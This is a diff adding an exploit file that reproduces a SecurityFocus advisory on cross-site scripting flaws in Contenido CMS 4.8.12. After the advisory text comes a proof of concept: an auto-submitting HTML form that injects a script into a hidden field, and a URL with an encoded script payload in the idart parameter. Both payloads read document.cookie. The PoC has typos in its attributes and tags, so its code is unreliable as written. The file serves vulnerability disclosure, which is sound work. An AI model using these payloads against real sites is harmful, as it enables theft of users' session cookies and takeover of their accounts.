@@ -1,0 +1,18 @@
+source: http://www.securityfocus.com/bid/45160/info
+
+Contenido CMS is prone to multiple cross-site-scripting vulnerabilities because it fails to properly sanitize user-supplied input.
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may let the attacker steal cookie-based authentication credentials and launch other attacks.
+
+Contenido CMS 4.8.12 is vulnerable; other versions may also be affected. 
+
+<form action=http://www.example.com/path/to/contact/form.html?parentid= methos=POST name=M>
+<input type="hidden" name="send" valuye="1">
+<input type="hidden" name="Vorname" valuye=&#039;z"><script>alert(document.cookie)</script>&#039;>
+</form>
+<script>
+document.M.Submit();
+<script>
+
+
+http://www.example.com/en/front_content.php?idart=1267%27%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E
